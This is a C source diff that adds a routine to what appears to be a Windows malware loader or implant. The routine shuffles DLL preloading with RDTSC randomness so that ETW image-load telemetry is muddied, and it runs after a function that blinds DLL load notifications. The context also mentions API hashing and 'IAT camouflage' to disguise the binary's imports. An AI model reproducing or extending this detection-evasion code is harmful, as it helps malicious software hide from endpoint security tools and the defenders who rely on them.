@@ -259,6 +259,38 @@ BOOL InitializeWinApis(OUT PAPI_HASHING pApi) {
 }
 
 // -----------------------------------------------
+// Fisher-Yates shuffle the supplied DLL names, then
+// LoadLibraryA each. All referenced DLLs end up in
+// the loaded-module list but in a per-run-random order
+// (RDTSC-seeded). Downstream modules still call
+// LoadLibraryA but hit the loader cache → no second
+// ETW image-load event. Run this AFTER
+// BlindDllNotifications so user-mode callbacks are
+// already severed; kernel ETW sees the shuffled order.
+// -----------------------------------------------
+VOID ShufflePreloadLibraries(IN PAPI_HASHING pApi, IN LPCSTR* pNames, IN DWORD dwCount) {
+
+    if (!pApi || !pApi->pLoadLibraryA || !pNames || dwCount == 0)
+        return;
+
+    // Local index permutation (cap keeps stack bounded; callers use ≤8)
+    DWORD idx[16];
+    if (dwCount > 16)
+        dwCount = 16;
+    for (DWORD i = 0; i < dwCount; i++)
+        idx[i] = i;
+
+    // Fisher-Yates using RDTSC as the entropy source
+    for (DWORD i = dwCount - 1; i > 0; i--) {
+        DWORD j = (DWORD)(__rdtsc() % (i + 1));
+        DWORD t = idx[i]; idx[i] = idx[j]; idx[j] = t;
+    }
+
+    for (DWORD i = 0; i < dwCount; i++)
+        pApi->pLoadLibraryA(pNames[idx[i]]);
+}
+
+// -----------------------------------------------
 // IAT Camouflage
 // Import benign WinAPIs to pad the IAT
 // Uses compile-time seed trick to prevent
